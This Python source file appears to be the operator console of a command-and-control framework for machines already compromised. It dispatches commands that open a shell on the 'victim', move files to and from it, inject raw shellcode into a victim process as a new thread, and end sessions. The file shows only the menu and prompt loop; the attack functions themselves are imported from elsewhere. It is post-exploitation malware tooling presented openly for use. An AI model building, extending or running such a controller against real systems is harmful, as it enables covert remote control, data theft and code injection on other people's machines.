''' This file will contain a method that will be called when the interact command will be used. This will act a sort of another CLI as well. '''
from multiprocessing.spawn import import_main_path
from tabulate import tabulate
from methods.interact import interact
from methods.interact.interact import Connection
from listeners import Connection
from colorama import Fore

def CLEAR(*args):
    from os import system, name
    system("cls" if name == "nt" else "clear")

def HELP(*args):
    data = [[item[0], item[1][0]] for item in COMMANDS.items() if item[1][2]]
    print(
        "\n",
        tabulate(
            data,
            headers=["Command", "Description"]
        ),
        "\n"
    )

COMMANDS = {
    "HELP"      : ("Display the help menu", HELP, False),
    "OPTIONS"   : ("Display the help menu", HELP, False),
    "EXIT"      : ("Exit the program", interact.EXIT, False),
    "QUIT"      : ("Exit the program", interact.EXIT, False),
    "CLEAR"     : ("Clear the screen", CLEAR, False),
    "CLS"       : ("Clear the screen", CLEAR, False),

    "SHELL"   : ("Spawn an interactive shell on the system", interact.SHELL, True),
    "SYSTEMINFO" : ("Display system information", interact.SYSTEMINFO, True),
    "UPLOAD"  : ("Upload a file to the victim", interact.UPLOAD, True),
    "PUT"       : ("Upload a file to the victim", interact.UPLOAD, False),
    "DOWNLOAD"    : ("Download a file from the victim", interact.DOWNLOAD, True),
    "GET"    : ("Download a file from the victim", interact.DOWNLOAD, False),

    "INJECT" : ("Inject a raw shellcode binary into the victim process (as a new thread)", interact.INJECT, True),
    "KILL" : ("KILLS the session", interact.KILL, True),
}

def parse_input(
    input_string : str
):
    if input_string == "" or input_string == None:
        return

    input_string = input_string.strip()
    cmds = input_string.split()
    
    if cmds[0].upper() not in COMMANDS.keys():
        print(f"[{Fore.RED}-{Fore.RESET}] Invalid Command")
        return

    COMMANDS[cmds[0].upper()][1](cmds[1:] if len(cmds) > 1 else None)

def _interact(data : Connection):
    global Connection


    print(f"[{Fore.GREEN}+{Fore.RESET}] Interacting with", data.UID)
    from utils.utils import basic_prompt, prompt

    while interact.is_running:
        try:
            parse_input(
                input(
                    f"({Fore.MAGENTA}{data.UID}{Fore.RESET}) {basic_prompt} {prompt} "
                )
            )
        except KeyboardInterrupt:
            print()
            continue
        except EOFError:
            print()
            break
